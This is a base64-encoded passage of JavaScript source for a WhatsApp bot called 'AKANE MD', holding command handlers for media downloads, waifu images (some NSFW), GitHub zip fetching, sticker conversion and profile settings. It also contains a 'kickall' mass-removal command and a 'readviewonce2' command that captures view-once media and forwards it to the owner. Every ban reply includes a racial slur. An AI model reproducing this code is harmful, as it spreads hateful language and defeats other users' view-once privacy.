W4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKaWYgKCF0ZXh0KSByZXR1cm4gcmVwbHkoImV4YW1wbGUgOiBsaW5rIGNoYW5uZWwiKQppZiAoIXRleHQuaW5jbHVkZXMoImh0dHBzOi8vd2hhdHNhcHAuY29tL2NoYW5uZWwvIikpIHJldHVybiByZXBseSgiTGluayBpcyBub3QgdmFsaWQgYnJvICIpCmxldCByZXN1bHQgPSB0ZXh0LnNwbGl0KCdodHRwczovL3doYXRzYXBwLmNvbS9jaGFubmVsLycpWzFdCmxldCByZXMgPSBhd2FpdCByaWNoLm5ld3NsZXR0ZXJNZXRhZGF0YSgiaW52aXRlIiwgcmVzdWx0KQpsZXQgdGVrcyA9IGAKKiAqSUQgOiogJHtyZXMuaWR9CiogKk5hbWUgOiogJHtyZXMubmFtZX0KKiAqRm9sbG93ZXI6KiAke3Jlcy5zdWJzY3JpYmVyc30KKiAqU3RhdHVzIDoqICR7cmVzLnN0YXRlfQoqICpWZXJpZmllZCA6KiAke3Jlcy52ZXJpZmljYXRpb24gPT0gIlZFUklGSUVEIiA/ICJWZXJpZmllZCIgOiAiTm8ifQpgCnJldHVybiByZXBseSh0ZWtzKQp9CmJyZWFrOwpjYXNlICdoZCc6CiAgY2FzZSAncmVtaW5pJzp7CiAgaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CmlmICghbS5xdW90ZWQpIHJldHVybiByZXBseShgV2hlcmUgaXMgdGhlIHBpY3R1cmU/YCkKCQkJaWYgKCEvaW1hZ2UvLnRlc3QobWltZSkpIHJldHVybiByZXBseShgU2VuZC9SZXBseSBQaG90byBXaXRoIGNhcHRpb24gJHtwcmVmaXggKyBjb21tYW5kfWApCgkJCXRyeSB7CgkJCWNvbnN0IHsgcmVtaW5pIH0gPSByZXF1aXJlKCcuL2xpYi9yZW1pbmknKQoJCQlsZXQgbWVkaWEgPSBhd2FpdCBxdW90ZWQuZG93bmxvYWQoKQoJCQlsZXQgcHJvc2VzID0gYXdhaXQgcmVtaW5pKG1lZGlhLCAiZW5oYW5jZSIpCgkJCXJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7IGltYWdlOiBwcm9zZXMsIGNhcHRpb246IGBfU3VjY2VzcyBpbiBNYWtpbmcgJHtjb21tYW5kfV9gfSwgeyBxdW90ZWQ6IG19KQoJCQl9IGNhdGNoIHsKCQkJICByZXBseSgnZXJybyBicm8nKQoJCQl9CgkJCX0KCQkJYnJlYWs7CgkJCQoJCQljYXNlICd0aWt0b2snOgpjYXNlICd0dCc6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CnJlcGx5Z2MobWVzcy53YWl0KQphd2FpdCBzbGVlcCgxMDApOwogIGlmICghdGV4dCkgcmV0dXJuIHJlcGx5KGBFeGFtcGxlOiAke3ByZWZpeCArIGNvbW1hbmR9IGxpbmtgKTsKdHJ5IHsKICBjb25zdCBkYXRhID0gYXdhaXQgZmV0Y2hKc29uKGBodHRwczovL2FwaS50aWtseWRvd24uZXUub3JnL2FwaS9kb3dubG9hZD91cmw9JHtlbmNvZGVVUklDb21wb25lbnQodGV4dCl9YCkKICBjb25zdCB2aWRueWEgPSBkYXRhLnZpZGVvLm5vV2F0ZXJtYXJrCiAgY29uc3QgY2FwdGlvbiA9IGAqWyBUSUtUT0sgRE9XTkxPQURFUiBCWSBBS0FORSBdKgoKPiAqVmlkZW8gZm91bmQqICR7ZGF0YS5hdXRob3IubmFtZSA/PyAnJ30gKEAke2RhdGEuYXV0aG9yLnVuaXF1ZV9pZCA/PyAnJ30pCj4gKkxpa2VzKjogJHtkYXRhLnN0YXRzLmxpa2VDb3VudCA/PyAnJ30KPiAqQ29tbWVudHMqOiAke2RhdGEuc3RhdHMuY29tbWVudENvdW50ID8/ICcnfQo+ICpTaGFyZXMqOiAke2RhdGEuc3RhdHMuc2hhcmVDb3VudCA/PyAnJ30KPiAqUGxheXMqOiAke2RhdGEuc3RhdHMucGxheUNvdW50ID8/ICcnfQo+ICpTYXZlcyo6ICR7ZGF0YS5zdGF0cy5zYXZlQ291bnQgPz8gJyd9Cgo+IFxgRG93bmxvYWRlciBCeSAke2JvdG5hbWV9XGAKYDsKICByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyBjYXB0aW9uOiBjYXB0aW9uLCB2aWRlbzogeyB1cmw6IHZpZG55YSB9IH0sIHsgcXVvdGVkOiBtIH0pCn0gY2F0Y2ggewogIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgZmV0Y2hKc29uKGBodHRwczovL2FwaS50aWtseWRvd24uZXUub3JnL2FwaS9kb3dubG9hZC92Mz91cmw9JHtlbmNvZGVVUklDb21wb25lbnQodGV4dCl9YCkKICBjb25zdCB2aWRlb1VybCA9IHJlc3BvbnNlLnJlc3VsdC52aWRlbzsKICBjb25zdCBjYXB0aW9ubiA9IGAqWyBUSUtUT0sgRE9XTkxPQURFUiBdKgoKTGlrZXM6ICR7cmVzcG9uc2UucmVzdWx0LnN0YXRpc3RpY3MubGlrZUNvdW50ID8/ICcnfQpDb21tZW50czogJHtyZXNwb25zZS5yZXN1bHQuc3RhdGlzdGljcy5jb21tZW50Q291bnQgPz8gJyd9ClNoYXJlczogJHtyZXNwb25zZS5yZXN1bHQuc3RhdGlzdGljcy5zaGFyZUNvdW50ID8/ICcnfQpieSAke3Jlc3BvbnNlLnJlc3VsdC5hdXRob3Iubmlja25hbWUgPz8gJyd9CgpcYOKPpM2fzZ7Nn82eIERvd25sb2FkZXIgQnkgJHtib3RuYW1lfVxgCiAgYDsKICByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyBjYXB0aW9uOiBjYXB0aW9ubiwgdmlkZW86IHsgdXJsOiB2aWRlb1VybCB9IH0sIHsgcXVvdGVkOiBtIH0pCn0KCn0KYnJlYWs7CgpjYXNlICJud2FpZnUiOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogICAgY29uc3QgYXBpVXJsID0gYGh0dHBzOi8vcmVhcGVyeHh4eC1hbmltZS5oZi5zcGFjZS9hcGkvd2FpZnU/Y2F0ZWdvcnk9d2FpZnUmc2Z3PXRydWVgOwogICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBheGlvcy5nZXQoYXBpVXJsKTsKICAgIGNvbnN0IGRhdGEgPSBhd2FpdCByZXNwb25zZS5kYXRhOwogICAgY29uc3QgaW1hZ2VVcmwgPSBkYXRhLmltYWdlX3VybAogICAgCiAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgewogICAgICAgIGltYWdlOiB7IHVybDogaW1hZ2VVcmwgfSwKICAgICAgICBjYXB0aW9uOiAiYGBgWW91ciBOd2FpZnUgQUtBTkUgTURgYGDwn4CEIgogICAgICB9LCB7IHF1b3RlZDogbSB9KTsgLy8gQWRkIHF1b3RlZCBvcHRpb24gZm9yIGNvbnRleHQKICAgICAgfQogICAgICBicmVhawogICAgY2FzZSAicndhaWZ1IjogewogICAgaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiAgICBjb25zdCBpbWFnZVVybCA9IGBodHRwczovL2FwaXMuZGF2aWRjeXJpbHRlY2gubXkuaWQvcmFuZG9tL3dhaWZ1YDsKICAgIGF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7CiAgICAgICAgaW1hZ2U6IHsgdXJsOiBpbWFnZVVybCB9LAogICAgICAgIGNhcHRpb246ICJgYGBZb3VyIFJhbmRvbSBXYWlmdSBieSBBS0FORSBNRPCfgIRgYGAiCiAgICAgIH0sIHsgcXVvdGVkOiBtIH0pOyAvLyBBZGQgcXVvdGVkIG9wdGlvbiBmb3IgY29udGV4dAogICAgICB9CiAgICAgIGJyZWFrOwogICAgICBjYXNlICd3YWlmdScgOgoKd2FpZnVkZCA9IGF3YWl0IGF4aW9zLmdldChgaHR0cHM6Ly93YWlmdS5waWNzL2FwaS9uc2Z3L3dhaWZ1YCkgCnJpY2guc2VuZE1lc3NhZ2UoZnJvbSwge2ltYWdlOiB7dXJsOndhaWZ1ZGQuZGF0YS51cmx9LGNhcHRpb246YFlvdXIgd2FpZnUgYnkgQUtBTkUgTUTwn4CEYH0sIHsgcXVvdGVkOm0gfSkuY2F0Y2goZXJyID0+IHsKIHJldHVybignRXJyb3IhJykKfSkKYnJlYWs7ICAgICAgCmNhc2UgJ2dpdCc6IGNhc2UgJ2dpdGNsb25lJzoKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CmlmICghYXJnc1swXSkgcmV0dXJuIHJlcGx5KGBXaGVyZSBpcyB0aGUgbGluaz9cbkV4YW1wbGUgOlxuJHtwcmVmaXh9JHtjb21tYW5kfSBodHRwczovL2dpdGh1Yi5jb21gKQppZiAoIWlzVXJsKGFyZ3NbMF0pICYmICFhcmdzWzBdLmluY2x1ZGVzKCdnaXRodWIuY29tJykpIHJldHVybiByZXBseW5hbm8oYExpbmsgaW52YWxpZCEhYCkKbGV0IHJlZ2V4MSA9IC8oPzpodHRwc3xnaXQpKD86OlwvXC98QClnaXRodWJcLmNvbVtcLzpdKFteXC86XSspXC8oLispL2kKICAgIGxldCBbLCB1c2VyLCByZXBvXSA9IGFyZ3NbMF0ubWF0Y2gocmVnZXgxKSB8fCBbXQogICAgcmVwbyA9IHJlcG8ucmVwbGFjZSgvLmdpdCQvLCAnJykKICAgIGxldCB1cmwgPSBgaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy8ke3VzZXJ9LyR7cmVwb30vemlwYmFsbGAKICAgIGxldCBmaWxlbmFtZSA9IChhd2FpdCBmZXRjaCh1cmwsIHttZXRob2Q6ICdIRUFEJ30pKS5oZWFkZXJzLmdldCgnY29udGVudC1kaXNwb3NpdGlvbicpLm1hdGNoKC9hdHRhY2htZW50OyBmaWxlbmFtZT0oLiopLylbMV0KICAgIHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7IGRvY3VtZW50OiB7IHVybDogdXJsIH0sIGZpbGVOYW1lOiBmaWxlbmFtZSsnLnppcCcsIG1pbWV0eXBlOiAnYXBwbGljYXRpb24vemlwJyB9LCB7IHF1b3RlZDogbSB9KS5jYXRjaCgoZXJyKSA9PiByZXBseW5hbm8obWVzcy5lcnJvcikpCmJyZWFrOwoKICAgICAgIGJyZWFrOwogICAgICAgY2FzZSAia2lja2FsbCI6CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwppZiAoIWlzQ3JlYXRvcikgcmV0dXJuIG0ucmVwbHkoImBgYGZvciBPd25lciBvbmx5YGBgLiIpOwppZiAoIW0uaXNHcm91cCkgcmV0dXJuIG0ucmVwbHkobWVzcy5ncm91cCkKaWYgKCFpc0JvdEFkbWlucykgcmV0dXJuIG0ucmVwbHkobWVzcy5ib3RBZG1pbikKaWYgKCFpc0FkbWlucykgcmV0dXJuIG0ucmVwbHkobWVzcy5hZG1pbikKbGV0IHVzZXJzID0gcGFydGljaXBhbnRzLmZpbHRlcigodSkgPT4gIWFyZUppZHNTYW1lVXNlcih1LmlkLCByaWNoLnVzZXIuaWQpKTsgCiAgIGxldCBraWNrZWRVc2VyID0gW107IAogICBmb3IgKGxldCB1c2VyIG9mIHVzZXJzKSB7IAogICAgIGlmICh1c2VyLmlkLmVuZHNXaXRoKCJAcy53aGF0c2FwcC5uZXQiKSAmJiAhdXNlci5hZG1pbikgeyAKICAgICAgIGF3YWl0IGtpY2tlZFVzZXIucHVzaCh1c2VyLmlkKTsgCiAgICAgICBhd2FpdCBzbGVlcCgxICogMTAwMCk7IAogICAgIH0gCiAgIH0gCiAgIGlmICgha2lja2VkVXNlci5sZW5ndGggPj0gMSkgCiAgICAgcmV0dXJuIG0ucmVwbHkoIkluIHRoaXMgZ3JvdXAgdGhlcmUgYXJlIG5vIG1lbWJlcnMgZXhjZXB0IHlvdSBhbmQgbWUiKTsgCiAgIGNvbnN0IHJlcyA9IGF3YWl0IHJpY2guZ3JvdXBQYXJ0aWNpcGFudHNVcGRhdGUobS5jaGF0LCBraWNrZWRVc2VyLCAicmVtb3ZlIik7IAogICBhd2FpdCBzbGVlcCgzMDAwKTsgCiAgIGF3YWl0IG0ucmVwbHkoIAogICAgIGBzdWNlc3NmdWxseSBraWNrZWQgbWVtYmVyXG4ke2tpY2tlZFVzZXIubWFwKCAKICAgICAgICh2KSA9PiAiQCIgKyB2LnNwbGl0KCJAIilbMF0gCiAgICAgKX1gLCAKICAgICBudWxsLCAKICAgICB7IAogICAgICAgbWVudGlvbnM6IGtpY2tlZFVzZXIsIAogICAgIH0gCiAgICk7IApicmVhazsKY2FzZSAndG9pbWcnOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwoJY29uc3QgZ2V0UmFuZG9tID0gKGV4dCkgPT4gewogICAgICAgICAgICByZXR1cm4gYCR7TWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogMTAwMDApfSR7ZXh0fWAKICAgICAgICB9CiAgICAgICAgaWYgKCFtLnF1b3RlZCkgcmV0dXJuIHJlcGx5bmFubyhgX1JlcGx5IHRvIEFueSBTdGlja2VyLl9gKQogICAgICAgIGxldCBtaW1lID0gbS5xdW90ZWQubXR5cGUKaWYgKG1pbWUgPT0iaW1hZ2VNZXNzYWdlIiB8fCBtaW1lID09InN0aWNrZXJNZXNzYWdlIikKewogICAgICAgIGxldCBtZWRpYSA9IGF3YWl0IHJpY2guZG93bmxvYWRBbmRTYXZlTWVkaWFNZXNzYWdlKG0ucXVvdGVkKQogICAgICAgIGxldCBuYW1lID0gYXdhaXQgZ2V0UmFuZG9tKCcucG5nJykKICAgICAgICBleGVjKGBmZm1wZWcgLWkgJHttZWRpYX0gJHtuYW1lfWAsIChlcnIpID0+IHsKICAgICAgICAJZnMudW5saW5rU3luYyhtZWRpYSkKICAgICAgICAgICAgbGV0IGJ1ZmZlciA9IGZzLnJlYWRGaWxlU3luYyhuYW1lKQogICAgICAgICAgICByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyBpbWFnZTogYnVmZmVyIH0sIHsgcXVvdGVkOiBtIH0pICAgICAgCmZzLnVubGlua1N5bmMobmFtZSkKICAgICAgICB9KQogICAgICAgIAp9IGVsc2UgcmV0dXJuIHJlcGx5KGBQbGVhc2UgcmVwbHkgdG8gbm9uIGFuaW1hdGVkIHN0aWNrZXJgKQogICAgfQogICAgYnJlYWs7CiAgICAgICAgCi8vID09PSBDQVNFIEhBTkRMRVIgPT09CmNhc2UgJ3BvbGxtZW51JzoKICBhd2FpdCBzZW5kUG9sbEJ1dHRvbk1lbnUocmljaCwgZnJvbSwgbSk7CiAgYnJlYWs7CgpjYXNlICd2b3RlMSc6CiAgYXdhaXQgcmljaC5zZW5kTWVzc2FnZShmcm9tLCB7IHRleHQ6ICIqWW91IHZvdGVkOiBBbmltZSBDb21tYW5kcyoiIH0sIHsgcXVvdGVkOiBtIH0pOwogIGJyZWFrOwoKY2FzZSAndm90ZTInOgogIGF3YWl0IHNvY2suc2VuZE1lc3NhZ2UoZnJvbSwgeyB0ZXh0OiAiKllvdSB2b3RlZDogR2FtZXMgJiBYUCoiIH0sIHsgcXVvdGVkOiBtIH0pOwogIGJyZWFrOwoKY2FzZSAndm90ZTMnOgogIGF3YWl0IHNvY2suc2VuZE1lc3NhZ2UoZnJvbSwgeyB0ZXh0OiAiKllvdSB2b3RlZDogQW50aS1MaW5rKiIgfSwgeyBxdW90ZWQ6IG0gfSk7CiAgYnJlYWs7CiAgCiAgICBjYXNlICdzZXRib3RwcCc6CiAgICAgICAgICAgIGNhc2UgJ3NldHBwJzoKICAgICAgICAgICAgY2FzZSAnc2V0cHAnOgogICAgICAgICAgICBjYXNlICdzZXRwcGJvdCc6CiAgICAgICAgICAgIGlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogICAgICAgICAgICAgICAgaWYgKCFpc0NyZWF0b3IpIHJldHVybiByZXBseSgiYGBgeW91ciBub3QgbXkgb3duZXIgc3Vja2VyYGBgIik7CiAgICAgICAgICAgICAgICBpZiAoIXF1b3RlZCkgcmV0dXJuIHJlcGx5KGBTZW5kL1JlcGx5IEltYWdlIFdpdGggQ2FwdGlvbiAke3ByZWZpeCArIGNvbW1hbmR9YCkKICAgICAgICAgICAgICAgIGlmICghL2ltYWdlLy50ZXN0KG1pbWUpKSByZXR1cm4gcmVwbHkoYFNlbmQvUmVwbHkgSW1hZ2UgV2l0aCBDYXB0aW9uICR7cHJlZml4ICsgY29tbWFuZH1gKQogICAgICAgICAgICAgICAgaWYgKC93ZWJwLy50ZXN0KG1pbWUpKSByZXR1cm4gcmVwbHkoYFNlbmQvUmVwbHkgSW1hZ2UgV2l0aCBDYXB0aW9uICR7cHJlZml4ICsgY29tbWFuZH1gKQogICAgICAgICAgICAgICAgdmFyIG1lZGlzID0gYXdhaXQgcmljaC5kb3dubG9hZEFuZFNhdmVNZWRpYU1lc3NhZ2UocXVvdGVkLCAncHBib3QuanBlZycpCiAgICAgICAgICAgICAgICBpZiAoYXJnc1swXSA9PSAnZnVsbCcpIHsKICAgICAgICAgICAgICAgICAgICB2YXIgewogICAgICAgICAgICAgICAgICAgICAgICBpbWcKICAgICAgICAgICAgICAgICAgICB9ID0gYXdhaXQgZ2VuZXJhdGVQcm9maWxlUGljdHVyZShtZWRpcykKICAgICAgICAgICAgICAgICAgICBhd2FpdCByaWNoLnF1ZXJ5KHsKICAgICAgICAgICAgICAgICAgICAgICAgdGFnOiAnaXEnLAogICAgICAgICAgICAgICAgICAgICAgICBhdHRyczogewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdG86IGJvdE51bWJlciwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICdzZXQnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgeG1sbnM6ICd3OnByb2ZpbGU6cGljdHVyZScKICAgICAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAgICAgY29udGVudDogW3sKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhZzogJ3BpY3R1cmUnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgYXR0cnM6IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAnaW1hZ2UnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGVudDogaW1nCiAgICAgICAgICAgICAgICAgICAgICAgIH1dCiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICBmcy51bmxpbmtTeW5jKG1lZGlzKQogICAgICAgICAgICAgICAgICAgIHJlcGx5KG0uZG9uZSkKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIG1lbWVnID0gYXdhaXQgcmljaC51cGRhdGVQcm9maWxlUGljdHVyZShib3ROdW1iZXIsIHsKICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBtZWRpcwogICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgZnMudW5saW5rU3luYyhtZWRpcykKICAgICAgICAgICAgICAgICAgICByZXBseShtLmRvbmUpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBicmVhazsKCiAgICBjYXNlICdjb2ZmZWUnOiBjYXNlICdrb3BpJzogewpyaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwge2NhcHRpb246IG0uc3VjY2VzcywgaW1hZ2U6IHsgdXJsOiAnaHR0cHM6Ly9jb2ZmZWUuYWxleGZsaXBub3RlLmRldi9yYW5kb20nIH19LCB7IHF1b3RlZDogbSB9KQogICAgICAgICAgICB9CiAgICAgICAgICAgIGJyZWFrOyAKY2FzZSAncGlja3VwbGluZSc6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CnRyeSB7CiAgICBsZXQgcmVzID0gYXdhaXQgZmV0Y2goYGh0dHBzOi8vYXBpLnBvcGNhdC54eXovcGlja3VwbGluZXNgKQogICAgaWYgKCFyZXMub2spIHsKICAgICAgdGhyb3cgbmV3IEVycm9yKGBBUEkgcmVxdWVzdCBmYWlsZWQgd2l0aCBzdGF0dXMgJHtyZXMuc3RhdHVzfWApCiAgICB9CiAgICBsZXQganNvbiA9IGF3YWl0IHJlcy5qc29uKCkKICAgIGxldCBwaWNrdXBMaW5lID0gYCpZT1UgR09UIFJJWlpFRCBVUCBCWSBBS0FORSBNRDoqXG5cblxgXGBcYCR7anNvbi5waWNrdXBsaW5lfVxgXGBcYGAKICAgIHJlcGx5KHBpY2t1cExpbmUpCiAgfSBjYXRjaCAoZXJyb3IpIHsKICAgIGNvbnNvbGUuZXJyb3IoZXJyb3IpCiAgICAvLyBIYW5kbGUgdGhlIGVycm9yIGFwcHJvcHJpYXRlbHkKICB9CiAgfQogIGJyZWFrOwpjYXNlICJhcGsiOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogICAgaWYgKCFxKSByZXR1cm4gcmVwbHkoIvCfk4wgKlVzYWdlOiogYC5hcGsgPGFwcCBuYW1lPmBcblxu8J+UuSAqRXhhbXBsZToqIGAuYXBrIEZhY2Vib29rIExpdGVgIik7CiAgICAKICB0cnkgewogICAgICAgIGxldCBhcGlVcmwgPSBgaHR0cHM6Ly9kcmFjdWxhenh5LXh5emRyYWMuaGYuc3BhY2UvYXBpL0Fwaz9xPSR7ZW5jb2RlVVJJQ29tcG9uZW50KHEpfWA7CgogICAgICAgIGxldCByZXNwb25zZSA9IGF3YWl0IGZldGNoKGFwaVVybCk7CiAgICAgICAgbGV0IGRhdGEgPSBhd2FpdCByZXNwb25zZS5qc29uKCk7CgogICAgICAgIGlmIChkYXRhLlNUQVRVUyAhPT0gMjAwIHx8ICFkYXRhLkFQUCkgewogICAgICAgICAgICByZXR1cm4gcmVwbHkoYOKdjCAqQXBwIG5vdCBmb3VuZCEqXG5cblRyeSBzZWFyY2hpbmcgZm9yIGEgZGlmZmVyZW50IGFwcGxpY2F0aW9uLmApOwogICAgICAgIH0KCiAgICAgICAgbGV0IHsgdGl0bGUsIGFwcElkLCBzaXplLCBkb3dubG9hZFVybCwgYXBwSW1hZ2UgfSA9IGRhdGEuQVBQOwoKICAgICAgICBsZXQgY2FwdGlvbiA9IGAK8J+TsiAqQXBwIEZvdW5kOiAke3RpdGxlfSogIArilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIEK8J+TjCAqQXBwIElEOiogJHthcHBJZH0gIArwn5OPICpTaXplOiogJHtzaXplfSAgCuKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgQo+IFBPV0VSRUQgQlkgQUtBTkUgTUQgCiAgICAgICAgYC50cmltKCk7CiAgICAgICAgYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsKICAgICAgICAgICAgaW1hZ2U6IHsgdXJsOiBhcHBJbWFnZSB9LAogICAgICAgICAgICBjYXB0aW9uOiBjYXB0aW9uCiAgICAgICAgfSk7CgogIGF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7CiAgICBkb2N1bWVudDogeyB1cmw6IGRvd25sb2FkVXJsIH0sCiAgICBtaW1ldHlwZTogImFwcGxpY2F0aW9uL3ZuZC5hbmRyb2lkLnBhY2thZ2UtYXJjaGl2ZSIsCiAgICAgICAgICAgIGZpbGVOYW1lOiBgJHt0aXRsZX0uYXBrYCwKICAgIH0sIHsgcXVvdGVkOiBtIH0pOwoKICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgY29uc29sZS5lcnJvcigi4p2MIEVycm9yIGluIGFwayBjYXNlOiIsIGVycm9yLm1lc3NhZ2UpOwogICAgICAgIHJlcGx5KCLimqDvuI8gKlNlcnZlciBFcnJvciEqXG5cblBsZWFzZSB0cnkgYWdhaW4gbGF0ZXIuIik7CiAgICB9Cn0KYnJlYWs7CgpjYXNlICdmYW5jeSc6IApjYXNlICdzdHlsZXRleHQnOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogIGlmICghdGV4dCkgcmV0dXJuIG0ucmVwbHkoZXhhbXBsZSgnRW50ZXIgUXVlcnkgdGV4dCEnKSkKICBsZXQgYW51ID0gYXdhaXQgc3R5bGV0ZXh0KHRleHQpCiAgbGV0IHRla3MgPSBgU3R5bGUgVGV4dCBGcm9tICR7dGV4dH1cblxuYAogIGZvciAobGV0IGkgPSAwOyBpIDwgYW51Lmxlbmd0aDsgaSsrKSB7CiAgICB0ZWtzICs9IGAke2kgKyAxfS4gJHthbnVbaV0ubmFtZX0gOiAke2FudVtpXS5yZXN1bHR9XG5cbmAKICB9CiAgYXdhaXQgbS5yZXBseSh0ZWtzKQp9IApicmVhazsKY2FzZSAiaG1wIjogY2FzZSAidnYyIjogY2FzZSAicmVhZHZpZXdvbmNlMiI6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CmlmICghaXNDcmVhdG9yKSByZXR1cm4gbS5yZXBseSgiYGBgZm9yIE93bmVyIG9ubHlgYGAuIik7CiAgICBpZiAoIW0ucXVvdGVkKSB7CiAgICAgICAgcmV0dXJuIG0ucmVwbHkoYCpSZXBseSB0byBhbiBpbWFnZSwgdmlkZW8sIG9yIGF1ZGlvIHdpdGggdGhlIGNhcHRpb24gJHtwcmVmaXggKyBjb21tYW5kfSpgKTsKICAgIH0KCiAgICBsZXQgbWltZSA9IChtLnF1b3RlZC5tc2cgfHwgbS5xdW90ZWQpLm1pbWV0eXBlIHx8ICcnOwogICAgdHJ5IHsKICAgICAgICBpZiAoL2ltYWdlLy50ZXN0KG1pbWUpKSB7CiAgICAgICAgICAgIGxldCBtZWRpYSA9IGF3YWl0IG0ucXVvdGVkLmRvd25sb2FkKCk7CiAgICAgICAgICAgIGF3YWl0IHJpY2guc2VuZE1lc3NhZ2UoYm90TnVtYmVyLCB7CiAgICAgICAgICAgICAgICBpbWFnZTogbWVkaWEsCiAgICAgICAgICAgICAgICBjYXB0aW9uOiAiICIsCiAgICAgICAgICAgIH0sIHsgcXVvdGVkOiBtIH0pOwoKICAgICAgICB9IGVsc2UgaWYgKC92aWRlby8udGVzdChtaW1lKSkgewogICAgICAgICAgICBsZXQgbWVkaWEgPSBhd2FpdCBtLnF1b3RlZC5kb3dubG9hZCgpOwogICAgICAgICAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKGJvdE51bWJlciwgewogICAgICAgICAgICAgICAgdmlkZW86IG1lZGlhLAogICAgICAgICAgICAgICAgY2FwdGlvbjogIiIsCiAgICAgICAgICAgIH0sIHsgcXVvdGVkOiBtIH0pOwoKICAgICAgICB9IGVsc2UgaWYgKC9hdWRpby8udGVzdChtaW1lKSkgewogICAgICAgICAgICBsZXQgbWVkaWEgPSBhd2FpdCBtLnF1b3RlZC5kb3dubG9hZCgpOwogICAgICAgICAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKGJvdE51bWJlciwgewogICAgICAgICAgICAgICAgYXVkaW86IG1lZGlhLAogICAgICAgICAgICAgICAgbWltZXR5cGU6ICdhdWRpby9tcGVnJywKICAgICAgICAgICAgICAgIHB0dDogdHJ1ZSAvLyBTZXQgdG8gdHJ1ZSBpZiB5b3Ugd2FudCB0byBzZW5kIGFzIGEgdm9pY2Ugbm90ZQogICAgICAgICAgICB9LCB7IHF1b3RlZDogbSB9KTsKCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgbS5yZXBseShg4p2MIFVuc3VwcG9ydGVkIG1lZGlhIHR5cGUhXG5SZXBseSB0byBhbiBpbWFnZSwgdmlkZW8sIG9yIGF1ZGlvIHdpdGggKiR7cHJlZml4ICsgY29tbWFuZH0qYCk7CiAgICAgICAgfQogICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgY29uc29sZS5lcnJvcignRXJyb3IgcHJvY2Vzc2luZyBtZWRpYTonLCBlcnIpOwogICAgICAgIG0ucmV